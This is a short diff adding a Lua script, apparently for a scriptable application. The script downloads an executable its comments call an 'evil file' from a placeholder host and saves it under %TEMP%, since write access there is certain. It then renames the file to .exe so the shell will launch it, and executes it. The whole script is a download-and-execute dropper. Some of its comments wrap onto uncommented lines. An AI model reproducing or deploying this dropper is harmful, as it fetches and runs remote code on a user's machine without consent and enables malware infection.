@@ -1,0 +1,25 @@
+require 'scripts\\websession'
+require 'scripts\\webfile'
+-- evil file to download
+local szURL='http://www.example.com/exploit.exe'
+-- setup download evil file from the web
+ses=websession.new()
+file=ses.openURL(szURL)
+local destfilename=GetTempFileName()                   -- we always want
+to download to the %TEMP% directory (write access = sure thing)
+destfilename=string.gsub(destfilename, ".tmp", ".exe") -- rename to
+something shellexecute will launch
+file.setDestFile(destfilename)
+local filesize=file.seek(0,FILE_END)
+file.seek(0,FILE_BEGIN)
+local bytescount=0
+local readbytes=file.read()
+while (readbytes>0) do
+bytescount=bytescount + readbytes
+readbytes=file.read()
+end
+-- close the descriptors
+file.release()
+ses.release()
+-- execute
+GetURL(destfilename)
